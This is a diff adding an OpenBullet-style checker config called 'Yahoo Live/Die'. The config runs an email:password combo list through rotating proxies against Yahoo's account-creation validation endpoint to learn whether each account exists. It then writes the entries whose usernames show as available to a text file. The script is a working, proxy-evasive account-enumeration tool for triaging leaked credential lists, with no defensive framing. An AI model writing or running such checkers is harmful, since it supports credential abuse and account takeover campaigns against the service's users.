@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "Yahoo Live/Die",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2023-04-13T14:35:45.3089257+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "https://www.facebook.com/Nhatkon.HD",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Yahoo live die",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://login.yahoo.com/account/module/create?validateField=yid" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION CurrentUnixTime 
+
+#C PARSE "<SOURCE>" LR "name=\"cacheStored\">" "name=\"crumb\">" -> VAR "C" 
+
+#C2 FUNCTION Replace "<input type=\"hidden\" value=\"" "" "<C>" -> VAR "C2" 
+
+#crumb FUNCTION Replace "\"" "" "<C2>" -> VAR "crumb" 
+
+#A PARSE "<SOURCE>" LR "name=\"crumb\">" "name=\"acrumb\">" -> VAR "A" 
+
+#A2 FUNCTION Replace "<input type=\"hidden\" value=\"" "" "<A>" -> VAR "A2" 
+
+#acrumb FUNCTION Replace "\"" "" "<A2>" -> VAR "acrumb" 
+
+#US PARSE "<USER>" LR "" "@" -> VAR "US" 
+
+REQUEST POST "https://login.yahoo.com/account/module/create?validateField=yid" 
+  CONTENT "specId=yidreg&cacheStored=&crumb=<crumb>&acrumb=<acrumb>&done=https%3A%2F%2Fvn.yahoo.com%2F%3Fp%3Dus&googleIdToken=&authCode=&attrSetIndex=0&tos0=oath_freereg%7Cvn%7Cvi-VN&firstName=Tuan&lastName=Checker&yid=<US>&password=Anhcuoipro@123&shortCountryCode=VN&phone=0959382913&mm=10&dd=22&yyyy=2000&freeformGender=&signup=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: vi-VN,vi;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: login.yahoo.com" 
+  HEADER "Origin: https://login.yahoo.com" 
+  HEADER "Referer: https://login.yahoo.com/account/create?.lang=vi-VN&src=homepage&activity=ybar-signin&pspid=965620046&.done=https%3A%2F%2Fvn.yahoo.com%2F%3Fp%3Dus&specId=yidReg&done=https%3A%2F%2Fvn.yahoo.com%2F%3Fp%3Dus" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"errors\":[{\"name\":\"yid\",\"error\":\"IDENTIFIER_EXISTS\"}]}" 
+    KEY "{\"errors\":[{\"name\":\"yid\",\"error\":\"SOME_SPECIAL_CHARACTERS_NOT_ALLOWED\"}]}" 
+    KEY "{\"errors\":[{\"name\":\"yid\",\"error\":\"IDENTIFIER_NOT_AVAILABLE\"}]}" 
+    KEY "{\"errors\":[{\"name\":\"yid\",\"error\":\"NEED_AT_LEAST_ONE_ALPHA\"}]}" 
+    KEY "{\"errors\":[{\"name\":\"yid\",\"error\":\"ELECTION_SPECIFIC_WORD_PRESENT\"}]}" 
+  KEYCHAIN Success OR 
+    KEY "{\"errors\":[]}" 
+
+FUNCTION Constant "ĐOÀN TRỌNG NHẤT" -> CAP "Config By" 
+
+UTILITY File "YAHOO DIE V2.txt" AppendLines "<USER>:<PASS>" 
+
+FUNCTION Length "specId=yidreg&cacheStored=&crumb=<crumb>&acrumb=<acrumb>&done=https%3A%2F%2Fvn.yahoo.com%2F%3Fp%3Dus&googleIdToken=&authCode=&attrSetIndex=0&tos0=oath_freereg%7Cvn%7Cvi-VN&firstName=Tuan&lastName=Checker&yid=<US>&password=Anhcuoipro@123&shortCountryCode=VN&phone=0959382913&mm=10&dd=22&yyyy=2000&freeformGender=&signup=" 
+
